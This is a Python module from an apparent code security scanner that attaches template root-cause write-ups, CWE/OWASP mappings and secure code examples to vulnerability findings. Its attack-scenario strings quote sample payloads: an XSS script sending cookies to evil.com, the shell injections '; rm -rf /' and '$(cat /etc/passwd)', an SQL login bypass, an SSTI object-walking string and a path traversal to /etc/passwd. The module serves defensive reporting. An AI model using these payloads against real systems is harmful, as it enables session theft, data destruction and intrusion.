"""Root Cause Engine.

Generates complete root cause analysis for every finding:
- Description of the vulnerability
- Why it is vulnerable
- Root cause of the issue
- Attack scenario
- Business impact
- Exploitability and likelihood
- Secure coding recommendation
- References to CWE/OWASP
- Secure example code

No section should ever be empty.
"""

from __future__ import annotations

from dataclasses import dataclass, field


@dataclass
class RootCauseAnalysis:
    """Complete root cause analysis for a finding."""
    description: str = ""
    why_vulnerable: str = ""
    root_cause: str = ""
    attack_scenario: str = ""
    business_impact: str = ""
    exploitability: str = ""
    likelihood: str = ""
    recommendation: str = ""
    secure_example: str = ""
    references: list[str] = field(default_factory=list)
    cwe: str = ""
    cwe_name: str = ""
    owasp: str = ""


# ============================================================
# Root cause templates by category
# ============================================================

ROOT_CAUSE_TEMPLATES = {
    "sql_injection": {
        "description": "SQL injection vulnerability allows attackers to execute arbitrary SQL commands by injecting malicious input into database queries.",
        "why_vulnerable": "User-controlled input is directly interpolated into SQL queries without parameterization, allowing attackers to modify query logic.",
        "root_cause": "The application concatenates user input into SQL query strings instead of using parameterized queries or prepared statements.",
        "attack_scenario": "An attacker crafts a malicious input such as ' OR '1'='1' -- to bypass authentication, or UNION SELECT to extract data from other tables. In severe cases, the database server can be fully compromised.",
        "business_impact": "Complete database compromise, unauthorized data access, data modification or deletion, potential lateral movement to other systems. May violate GDPR, HIPAA, PCI-DSS regulations.",
        "exploitability": "High - SQL injection is straightforward to exploit with readily available tools like sqlmap.",
        "likelihood": "High - Any input that reaches a database query is a potential injection vector.",
        "recommendation": "Use parameterized queries (prepared statements) for all database operations. Never concatenate user input into SQL strings. Use an ORM with proper parameterization.",
        "secure_example": "cursor.execute('SELECT * FROM users WHERE id = ?', (user_id,))\n# or with ORM:\nUser.objects.filter(id=user_id)",
        "cwe": "CWE-89",
        "cwe_name": "SQL Injection",
        "owasp": "A03:2021 - Injection",
    },
    "command_injection": {
        "description": "Command injection vulnerability allows attackers to execute arbitrary operating system commands through application input.",
        "why_vulnerable": "User-controlled input is passed to system command execution functions without sanitization, allowing attackers to inject additional commands.",
        "root_cause": "The application uses shell command execution functions (os.system, subprocess with shell=True) with unsanitized user input.",
        "attack_scenario": "An attacker injects commands like '; rm -rf /' or '$(cat /etc/passwd)' through user input fields, gaining full control of the server.",
        "business_impact": "Complete server compromise, data theft, ransomware deployment, lateral movement. The most severe vulnerability class.",
        "exploitability": "Very High - Command injection is trivial to exploit.",
        "likelihood": "High - Any user input reaching a shell command is exploitable.",
        "recommendation": "Use subprocess.run() with shell=False and explicit argument lists. Avoid shell=True. Never pass user input directly to shell commands.",
        "secure_example": "subprocess.run(['ls', '-la', user_dir], shell=False, check=True)\n# NOT: os.system(f'ls -la {user_dir}')",
        "cwe": "CWE-78",
        "cwe_name": "OS Command Injection",
        "owasp": "A03:2021 - Injection",
    },
    "code_injection": {
        "description": "Code injection vulnerability allows attackers to execute arbitrary code in the application's runtime environment.",
        "why_vulnerable": "Dynamic code execution functions (eval, exec) are called with user-controlled input, allowing arbitrary code execution.",
        "root_cause": "The application uses eval() or exec() with user-provided data without restricting the execution context.",
        "attack_scenario": "An attacker provides malicious Python code as input that gets executed in the application context, leading to full application compromise.",
        "business_impact": "Full application compromise, data access, privilege escalation, potential server takeover.",
        "exploitability": "High - Direct code execution when eval/exec receive user input.",
        "likelihood": "Critical - Every eval() with user input is directly exploitable.",
        "recommendation": "Never use eval() or exec() with user input. Use ast.literal_eval() for safe literal evaluation. Use json.loads() for JSON parsing.",
        "secure_example": "import ast\nresult = ast.literal_eval(user_input)  # Safe for literals\n# NOT: result = eval(user_input)",
        "cwe": "CWE-94",
        "cwe_name": "Code Injection",
        "owasp": "A03:2021 - Injection",
    },
    "xss": {
        "description": "Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users.",
        "why_vulnerable": "User-controlled input is rendered in HTML output without proper escaping or sanitization.",
        "root_cause": "The application outputs user-supplied data directly into HTML responses without HTML-encoding the content.",
        "attack_scenario": "An attacker injects <script>document.location='http://evil.com/steal?c='+document.cookie</script> to steal session tokens from other users.",
        "business_impact": "Session hijacking, credential theft, defacement, phishing. Affects all users who view the compromised page.",
        "exploitability": "High - XSS payloads can be crafted easily with URL encoding.",
        "likelihood": "High - Any reflected or stored user input in HTML responses is a vector.",
        "recommendation": "Use template auto-escaping. HTML-encode all user output. Implement Content Security Policy (CSP) headers.",
        "secure_example": "from markupsafe import escape\nrender_template('index.html', username=escape(user_input))",
        "cwe": "CWE-79",
        "cwe_name": "Cross-site Scripting",
        "owasp": "A03:2021 - Injection",
    },
    "deserialization": {
        "description": "Insecure deserialization allows attackers to execute arbitrary code by crafting malicious serialized objects.",
        "why_vulnerable": "The application deserializes untrusted data using insecure methods (pickle, yaml.load) that can execute arbitrary code during deserialization.",
        "root_cause": "Using pickle.load or yaml.load (without SafeLoader) on data from untrusted sources allows arbitrary code execution.",
        "attack_scenario": "An attacker crafts a malicious pickle object that executes arbitrary Python code when deserialized by the application.",
        "business_impact": "Remote code execution, full application compromise, data breach.",
        "exploitability": "Medium - Requires crafting a serialized payload but tools are available.",
        "likelihood": "Medium - Only exploitable if the application deserializes untrusted data.",
        "recommendation": "Use json instead of pickle for data serialization. Use yaml.safe_load() instead of yaml.load(). Never deserialize untrusted data.",
        "secure_example": "import json\ndata = json.loads(untrusted_input)  # Safe\n# NOT: data = pickle.loads(untrusted_input)",
        "cwe": "CWE-502",
        "cwe_name": "Deserialization of Untrusted Data",
        "owasp": "A08:2021 - Data Integrity Failures",
    },
    "hardcoded_secret": {
        "description": "Hardcoded credentials in source code can be extracted by anyone with access to the repository.",
        "why_vulnerable": "Sensitive credentials are embedded directly in source code rather than being stored in secure external configuration.",
        "root_cause": "Developer committed hardcoded credentials to the repository, making them accessible to anyone with repository access.",
        "attack_scenario": "An attacker with repository access (including public repositories) extracts the hardcoded credential and uses it to access the associated system.",
        "business_impact": "Unauthorized access to production systems, data breach, credential reuse across services.",
        "exploitability": "Very High - Simply reading the source code reveals the credential.",
        "likelihood": "High - If the repository is public, the credential is immediately exposed.",
        "recommendation": "Store credentials in environment variables or a secrets manager (HashiCorp Vault, AWS Secrets Manager). Use .env files for local development only.",
        "secure_example": "import os\npassword = os.environ.get('DB_PASSWORD')\n# NOT: password = 'admin123'",
        "cwe": "CWE-798",
        "cwe_name": "Use of Hard-coded Credentials",
        "owasp": "A07:2021 - Identification and Authentication Failures",
    },
    "template_injection": {
        "description": "Server-Side Template Injection (SSTI) allows attackers to execute arbitrary code through template engines.",
        "why_vulnerable": "User input is passed directly to template rendering functions without sanitization, allowing template code injection.",
        "root_cause": "Using render_template_string() or similar functions with user-controlled template content.",
        "attack_scenario": "An attacker injects template syntax like {{ config.items() }} or {% for c in ''.__class__.__mro__[1].__subclasses__() %} to access internal objects and execute code.",
        "business_impact": "Remote code execution, full server compromise.",
        "exploitability": "Medium - Requires knowledge of the template engine syntax.",
        "likelihood": "Medium - Only exploitable if user input reaches template rendering.",
        "recommendation": "Never use user input as template content. Use static templates with variable passing.",
        "secure_example": "render_template('greeting.html', name=user_name)\n# NOT: render_template_string(f'Hello {user_name}')",
        "cwe": "CWE-1336",
        "cwe_name": "Server-Side Template Injection",
        "owasp": "A03:2021 - Injection",
    },
    "path_traversal": {
        "description": "Path traversal vulnerability allows attackers to access files outside the intended directory.",
        "why_vulnerable": "User-controlled file paths are used without sanitization to access the filesystem.",
        "root_cause": "The application uses user input to construct file paths without validating that the resolved path stays within the intended directory.",
        "attack_scenario": "An attacker uses ../../../etc/passwd to read sensitive system files, or writes to arbitrary locations.",
        "business_impact": "Unauthorized file access, sensitive data exposure, potential code execution.",
        "exploitability": "High - Simple directory traversal sequences are easy to construct.",
        "likelihood": "High - Any file operation with user input is a potential vector.",
        "recommendation": "Validate that the resolved path stays within the intended directory. Use os.path.realpath() and check the prefix.",
        "secure_example": "import os\nbase = '/uploads'\nuser_path = os.path.join(base, os.path.basename(filename))\nassert os.path.realpath(user_path).startswith(os.path.realpath(base))",
        "cwe": "CWE-22",
        "cwe_name": "Path Traversal",
        "owasp": "A01:2021 - Broken Access Control",
    },
    "password_assignment": {
        "description": "Hardcoded password in source code represents a credential leak.",
        "why_vulnerable": "A password or secret value is directly assigned as a string literal in source code, making it visible to anyone with code access.",
        "root_cause": "The password was hardcoded into the application source rather than being loaded from environment variables or a secrets manager.",
        "attack_scenario": "An attacker with access to the source code (including version control history) extracts the password and uses it for unauthorized access.",
        "business_impact": "Account takeover, unauthorized system access, data breach. The credential persists in git history even after removal.",
        "exploitability": "Very High - Simply reading the source code reveals the credential.",
        "likelihood": "High - If the repository is accessible, the credential is immediately exposed.",
        "recommendation": "Use environment variables, secrets managers, or encrypted configuration. Never commit credentials to version control.",
        "secure_example": "password = os.environ.get('DB_PASSWORD')\n# or\nfrom decouple import config\npassword = config('DB_PASSWORD')",
        "cwe": "CWE-798",
        "cwe_name": "Use of Hard-coded Credentials",
        "owasp": "A07:2021 - Identification and Authentication Failures",
    },
}


GENERIC_TEMPLATE = {
    "description": "Security vulnerability detected in the code.",
    "why_vulnerable": "The code pattern does not follow security best practices and may expose the application to attacks.",
    "root_cause": "The vulnerability exists because the code does not properly validate or sanitize input, or uses insecure functions.",
    "attack_scenario": "An attacker could exploit this vulnerability by crafting malicious input that leverages the identified weakness.",
    "business_impact": "Potential data breach, unauthorized access, or system compromise depending on the vulnerability severity and location.",
    "exploitability": "Varies based on the specific vulnerability and its location in the application.",
    "likelihood": "Depends on the exposure of the vulnerable code path to untrusted input.",
    "recommendation": "Follow OWASP secure coding guidelines. Validate all inputs, use parameterized queries, and apply the principle of least privilege.",
    "secure_example": "# Follow security best practices for this vulnerability category",
    "references": [
        "https://owasp.org/Top10/",
        "https://cwe.mitre.org/",
    ],
    "cwe": "CWE-710",
    "cwe_name": "Improper Adherence to Coding Standards",
    "owasp": "A03:2021 - Injection",
}


def generate_root_cause(
    category: str,
    title: str = "",
    description: str = "",
    code_snippet: str = "",
    file_path: str = "",
    line: int = 0,
    severity: str = "",
    confidence: float = 0.0,
) -> RootCauseAnalysis:
    """Generate a complete root cause analysis for a finding.

    Every section is guaranteed to be non-empty.
    """
    template = ROOT_CAUSE_TEMPLATES.get(category, GENERIC_TEMPLATE)

    analysis = RootCauseAnalysis(
        description=template["description"],
        why_vulnerable=template["why_vulnerable"],
        root_cause=template["root_cause"],
        attack_scenario=template["attack_scenario"],
        business_impact=template["business_impact"],
        exploitability=template["exploitability"],
        likelihood=template["likelihood"],
        recommendation=template["recommendation"],
        secure_example=template["secure_example"],
        references=template.get("references", []),
        cwe=template.get("cwe", ""),
        cwe_name=template.get("cwe_name", ""),
        owasp=template.get("owasp", ""),
    )

    if file_path and line:
        analysis.description += f"\n\nLocation: {file_path}:{line}"
        analysis.root_cause += f"\n\nThe vulnerable code is at {file_path}:{line}."

    if code_snippet:
        analysis.root_cause += f"\n\nVulnerable pattern:\n```\n{code_snippet[:500]}\n```"

    if confidence < 0.5:
        analysis.likelihood += f"\n\nNote: Confidence is {confidence:.0%}. Manual verification recommended."

    return analysis


def enrich_finding_with_root_cause(finding: dict, category: str) -> dict:
    """Enrich a finding dict with root cause analysis fields."""
    rca = generate_root_cause(
        category=category,
        title=finding.get("title", ""),
        description=finding.get("description", ""),
        code_snippet=finding.get("code_snippet", ""),
        file_path=finding.get("file_path", ""),
        line=finding.get("line", 0),
        severity=finding.get("severity", ""),
        confidence=finding.get("confidence", 0.0),
    )

    finding.setdefault("description", rca.description)
    if not finding.get("why_vulnerable"):
        finding["why_vulnerable"] = rca.why_vulnerable
    if not finding.get("root_cause"):
        finding["root_cause"] = rca.root_cause
    if not finding.get("attack_scenario"):
        finding["attack_scenario"] = rca.attack_scenario
    if not finding.get("impact"):
        finding["impact"] = rca.business_impact
    if not finding.get("exploitability"):
        finding["exploitability"] = rca.exploitability
    if not finding.get("recommendation"):
        finding["recommendation"] = rca.recommendation
    if not finding.get("fix_suggestion"):
        finding["fix_suggestion"] = rca.recommendation
    if not finding.get("secure_example"):
        finding["secure_example"] = rca.secure_example
    if not finding.get("cwe"):
        finding["cwe"] = rca.cwe
    if not finding.get("cwe_name"):
        finding["cwe_name"] = rca.cwe_name
    if not finding.get("owasp_category"):
        finding["owasp_category"] = rca.owasp

    if rca.references:
        existing_refs = finding.get("references", [])
        finding["references"] = list(set(existing_refs + rca.references))

    return finding
